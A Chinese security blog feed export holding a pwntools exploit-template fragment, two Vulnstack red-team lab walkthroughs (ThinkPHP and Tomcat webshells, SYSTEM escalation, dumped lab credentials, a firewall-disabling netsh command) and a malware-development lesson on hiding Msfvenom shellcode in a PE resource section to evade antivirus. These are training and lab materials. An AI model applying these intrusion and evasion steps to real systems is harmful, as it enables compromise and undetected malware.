number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-5</title>
      <link href="/2024/11/21/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-5/"/>
      <url>/2024/11/21/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/7/">漏洞详情</a></p></blockquote><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>只有两台机子，一个外网一个内网</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">win7sun\leo 123.comsun\Administrator dc123.com2008sun\admin 2020.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>win7启动phpstudy<br><img src="/Rxi134_FILE/37514640ca23b85c2139045439df833e_MD5.jpeg"></p><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/Rxi134_FILE/bdc549cfcccaed50166046dc8a75eec1_MD5.jpeg"></p><h2 id="TP-tp5-construct-code-exec-1"><a href="#TP-tp5-construct-code-exec-1" class="headerlink" title="TP tp5_construct_code_exec_1"></a>TP tp5_construct_code_exec_1</h2><p>访问一下，一眼thinkphp<br><img src="/Rxi134_FILE/6a6fb455a71f3d0f7cb37dee1e0b7590_MD5.jpeg"></p><p>制造报错看下版本<br><img src="/Rxi134_FILE/4e90583701c7118f8126ee670d283af8_MD5.jpeg"></p><p>工具直接梭哈，命令无回显，挂个webshell<br><img src="/Rxi134_FILE/0ebd4784751b05b3d16fa72b9a1a8405_MD5.jpeg"><br><img src="/Rxi134_FILE/e8118b28dc98ebd577aa1926ea22166d_MD5.jpeg"></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>不是还有mysql吗，翻翻配置文件<br><img src="/Rxi134_FILE/a27437b3184c8bf057378695e642578e_MD5.jpeg"></p><h2 id="搭建socks隧道"><a href="#搭建socks隧道" class="headerlink" title="搭建socks隧道"></a>搭建socks隧道</h2><p>chisel失败，ew可以</p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>内网 ip 为 192.168.138.136，内网网段为 192.168.138.0&#x2F;24</p><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>systeminfo</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">C:\phpStudy\PHPTutorial\WWW\public> systeminfo主机名:           WIN7OS 名称:          Microsoft Windows 7 专业版 OS 版本:          6.1.7601 Service Pack 1 Build 7601OS 制造商:        Microsoft CorporationOS 配置:          成员工作站OS 构件类型:      Multiprocessor Free注册的所有人:     Windows 用户注册的组织:       产品 ID:          00371-177-0000061-85581初始安装日期:     2020/3/5, 0:44:56系统启动时间:     2024/11/21, 15:14:49系统制造商:       VMware, Inc.系统型号:         VMware Virtual Platform系统类型:         x64-based PC处理器:           安装了 1 个处理器。                  [01]: Intel64 Family 6 Model 183 Stepping 1 GenuineIntel ~2419 MhzBIOS 版本:        Phoenix Technologies LTD 6.00, 2020/11/12Windows 目录:     C:\Windows系统目录:         C:\Windows\system32启动设备:         \Device\HarddiskVolume1系统区域设置:     zh-cn;中文(中国)输入法区域设置:   zh-cn;中文(中国)时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     2,047 MB可用的物理内存:   1,310 MB虚拟内存: 最大值: 4,095 MB虚拟内存: 可用:   3,168 MB虚拟内存: 使用中: 927 MB页面文件位置:     C:\pagefile.sys域:               sun.com登录服务器:       暂缺修补程序:         安装了 3 个修补程序。                  [01]: KB2534111                  [02]: KB2999226                  [03]: KB976902网卡:             安装了 3 个 NIC。                  [01]: Intel(R) PRO/1000 MT Network Connection                      连接名:      wk1 waiwang                      启用 DHCP:   是                      DHCP 服务器: 192.168.74.254                      IP 地址                        [01]: 192.168.74.160                        [02]: fe80::42a:7d55:e4d9:8eff                  [02]: Bluetooth 设备(个人区域网)                      连接名:      Bluetooth 网络连接                      状态:        媒体连接已中断                  [03]: Intel(R) PRO/1000 MT Network Connection                      连接名:      本地连接                      启用 DHCP:   否                      IP 地址                        [01]: 192.168.138.136                        [02]: fe80::38d3:8142:9a7e:bb5f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>域名 sun.com </p><p><img src="/Rxi134_FILE/fc299f05da8c84da0b0b383a7a32d6e6_MD5.jpeg"></p><p>administrator 不在域中<br><img src="/Rxi134_FILE/c935093ae5dcf2defb190e0d818f8eab_MD5.jpeg"></p><h2 id="提权至SYSTEM"><a href="#提权至SYSTEM" class="headerlink" title="提权至SYSTEM"></a>提权至SYSTEM</h2><p>CS：<br>token窃取可以直接提权，getsystem直接梭<br><img src="/Rxi134_FILE/743bc3f1526bfa6a151d604539160589_MD5.jpeg"></p><h2 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">sun\administrator:dc123.comsun\leo:123.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>顺带进程注入到sun\leo</p><p><img src="/Rxi134_FILE/794a140928413875ea907ded1bd88157_MD5.jpeg"></p><h2 id="fscan大保健"><a href="#fscan大保健" class="headerlink" title="fscan大保健"></a>fscan大保健</h2><p><img src="/Rxi134_FILE/99aba2d4399562f7e9bcea3f9c03056c_MD5.jpeg"></p><p>用了一个魔改版的成功了<br><img src="/Rxi134_FILE/1562489a511af1ebb2e99073430d0b26_MD5.jpeg"></p><h2 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h2><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">netsh advfirewall set allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>msf exe没上线成功，用exe-small正连<br><img src="/Rxi134_FILE/685f5d6a9482e44b95b89ae6f2ad048c_MD5.jpeg"></p><h2 id="拿下DC"><a href="#拿下DC" class="headerlink" title="拿下DC"></a>拿下DC</h2><p>有了域管的账号实际已经是可以为所欲为了，后面省略</p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15.Payload Placement - .rsrc Section 有效负载放置</title>
      <link href="/2024/11/20/15.Payload%20Placement%20-%20.rsrc%20Section%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%94%BE%E7%BD%AE/"/>
      <url>/2024/11/20/15.Payload%20Placement%20-%20.rsrc%20Section%20%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%94%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>将有效负载存储在 <code>.rsrc</code> 部分是一个非常好的选择，因为大多数实际的二进制文件都将它们的数据保存在这里。对于恶意软件作者来说，这也是一种更清晰的方法，因为较大的有效负载无法存储在 <code>.text</code> 或 <code>.data</code> 等部分中，因为它们有大小限制，这会导致在编译时 Visual Studio 出现错误。</p><p>例如，你的程序要生成一个exe文件，而文件的图标是你自定义的图标。你就要在这个工程里面添加Icon资源，添加一个外部的ico文件，保存到.rc里面，因此可以直接调用图标文件。</p><h1 id="rsrc-部分"><a href="#rsrc-部分" class="headerlink" title=".rsrc 部分"></a>.rsrc 部分</h1><p>以下步骤说明了如何将有效负载存储在 .rsrc 部分：</p><ol><li><p>在 Visual Studio 中，右键点击 ‘资源文件’，然后点击 添加 &gt; 新项。<br><img src="/Rxi134_FILE/88b39d76c3df4ee2d1f8c0edcb6bdd41_MD5.jpeg"></p></li><li><p>点击“资源文件”<br><img src="/Rxi134_FILE/a571851f25fefa5c067c0b032dfb1468_MD5.jpeg"></p></li><li><p>这将生成一个新的侧边栏，即资源视图。右键点击 <code>.rc</code> 文件（默认名称为 Resource.rc），然后选择 <strong>添加资源</strong> 选项。<br><img src="/Rxi134_FILE/ff6099a04cb0de581f9261e3abc6301b_MD5.jpeg"></p></li><li><p>点击 ‘导入’.<br><img src="/Rxi134_FILE/5774dcc6b25edccecbda14e6b840d132_MD5.jpeg"></p></li><li><p>选择 calc.ico 文件，它是重命名为扩展名 ..ico 的原始有效负载<br><img src="/Rxi134_FILE/07c919f5a20a71be52d69939824158e3_MD5.jpeg"></p></li><li><p>将出现一条提示，要求输入资源类型。输入不带引号的“RCDATA”。<br><img src="/Rxi134_FILE/0e1d8c86241e1617c36d2ab0fb80d571_MD5.jpeg"></p></li><li><p>单击“确定”后，有效负载应在 Visual Studio 项目中以原始二进制格式显示<br><img src="/Rxi134_FILE/dfe9c7a161f65b0223b10f4ded2a654b_MD5.jpeg"></p></li><li><p>退出资源视图时，“resource.h”头文件应该可见，并根据步骤 2 中的 .rc 文件命名。该文件包含一个定义语句，引用资源部分中有效负载的 ID (IDR_RCDATA1) 。这对于稍后能够从资源部分检索有效负载非常重要。<br><img src="/Rxi134_FILE/1fd5fe0ddbec8973a08c837d8e570f79_MD5.jpeg"></p></li></ol><hr><p>编译后，有效负载现在将存储在该部分中，但无法直接访问。相反，必须使用多个 WinAPI 来访问 .rsrc</p><ul><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew">FindResourceW</a> - 获取存储在资源部分的指定数据的位置，该数据由传入的特殊 ID 指定（在头文件中定义）。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource">LoadResource</a> - 检索资源数据的句柄。此句柄可用于获取指定资源在内存中的基地址。返回类型为 <strong>HGLOBAL</strong>。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource">LockResource</a> - 从指定资源句柄中获取指向资源部分数据的指针。</p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource">SizeofResource</a> - 获取资源部分中指定数据的大小。</p></li></ul><p>下面的代码片段将利用上述 Windows API 来访问资源部分，并获取有效载荷的地址和大小：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"resource.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>HRSRChRsrc                   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>HGLOBALhGlobal                 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>PVOIDpPayloadAddress         <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>SIZE_TsPayloadSize            <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">// 获取存储在 .rsrc 中的数据位置，通过其 ID *IDR_RCDATA1*</span>hRsrc <span class="token operator">=</span> <span class="token function">FindResourceW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">MAKEINTRESOURCEW</span><span class="token punctuation">(</span>IDR_RCDATA1<span class="token punctuation">)</span><span class="token punctuation">,</span> RT_RCDATA<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hRsrc <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] FindResourceW 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 HGLOBAL，即指定资源数据的句柄，稍后需要调用 LockResource</span>hGlobal <span class="token operator">=</span> <span class="token function">LoadResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hRsrc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>hGlobal <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] LoadResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 .rsrc 部分中有效载荷的地址</span>pPayloadAddress <span class="token operator">=</span> <span class="token function">LockResource</span><span class="token punctuation">(</span>hGlobal<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pPayloadAddress <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] LockResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取 .rsrc 部分中有效载荷的大小</span>sPayloadSize <span class="token operator">=</span> <span class="token function">SizeofResource</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> hRsrc<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>sPayloadSize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果函数失败</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] SizeofResource 调用失败，错误码: %d \n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 打印指针和大小到屏幕上</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] pPayloadAddress 变量: 0x%p \n"</span><span class="token punctuation">,</span> pPayloadAddress<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] sPayloadSize 变量: %ld \n"</span><span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[#] 按 &lt;Enter> 键退出..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译并运行上述代码后，有效载荷的地址及其大小将被打印到屏幕上。需要注意的是，这个地址位于资源部分，该部分是只读内存，任何尝试在其中修改或编辑数据的操作都将导致访问冲突错误。如果要编辑有效载荷，必须分配一个与有效载荷大小相同的缓冲区，并将数据复制到该缓冲区。所有的修改（如解密有效载荷）都应在这个新缓冲区中进行。</p><h1 id="更新-rsrc-Payload"><a href="#更新-rsrc-Payload" class="headerlink" title="更新 .rsrc Payload"></a>更新 .rsrc Payload</h1><p>由于有效载荷不能直接从资源部分进行编辑，因此必须将其移动到一个临时缓冲区。为此，可以使用 <code>HeapAlloc</code> 分配与有效载荷大小相同的内存，然后通过 <code>memcpy</code> 将有效载荷从资源部分移动到临时缓冲区</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 使用 HeapAlloc 调用分配内存</span>PVOID pTmpBuffer <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pTmpBuffer <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 将有效载荷从资源部分复制到新的缓冲区</span><span class="token function">memcpy</span><span class="token punctuation">(</span>pTmpBuffer<span class="token punctuation">,</span> pPayloadAddress<span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 打印缓冲区的基地址 (pTmpBuffer)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] pTmpBuffer 变量: 0x%p \n"</span><span class="token punctuation">,</span> pTmpBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于现在 <code>pTmpBuffer</code> 指向一个可写的内存区域，并且该区域保存了有效载荷，因此可以对有效载荷进行解密或执行任何更新操作。</p><p>下面的图片显示了存储在资源部分的 Msfvenom shellcode：<br><img src="/Rxi134_FILE/40966272953f986b6f63a9c174a6a1fe_MD5.jpeg"></p><p>继续执行时，有效负载将保存在临时缓冲区中。<br><img src="/Rxi134_FILE/f0569689ebe78e06c268af3aa360db2c_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-4</title>
      <link href="/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/"/>
      <url>/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">漏洞详情</a></p></blockquote><p><img src="/Rxi134_FILE/01e760a174b100ab764f690ba82aaa18_MD5.jpeg"></p><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:ubuntu192.168.74.140192.168.183.128域成员机器douser:Dotest123192.168.183.129DCadministrator:Test2008192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p>web机器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>win7<br>win7总是挂起，修改设备计划<br><img src="/Rxi134_FILE/393f5041cfd50e06414cf2e793ebb750_MD5.jpeg"></p></li></ul><h1 id="边界"><a href="#边界" class="headerlink" title="边界"></a>边界</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>goby上去打些常见poc，随便把端口扫了<br><img src="/Rxi134_FILE/3243933a3096253353d76f94faab9aad_MD5.jpeg"></p><h2 id="tomcat-PUT-任意文件上传（CVE-2017-12615）"><a href="#tomcat-PUT-任意文件上传（CVE-2017-12615）" class="headerlink" title="tomcat PUT 任意文件上传（CVE-2017-12615）"></a>tomcat PUT 任意文件上传（CVE-2017-12615）</h2><p>tomcat 远程代码执行<br><img src="/Rxi134_FILE/d2eb0872f91e3d5bd9d08ed7f81b9c4f_MD5.jpeg"></p><p>工具直接梭哈，上传webshell<br><img src="/Rxi134_FILE/f39cc38d710b6095f7052a0ee7c05174_MD5.jpeg"></p><p>拿到root<br><img src="/Rxi134_FILE/731948ac195fef247d2ebc37dfc1b985_MD5.jpeg"></p><p>看了ip傻眼了，172.18.0.2 ？</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">(root:/tmp) $ uname -aLinux 09dd4e5bfa91 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 GNU/Linux(root:/tmp) $ ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 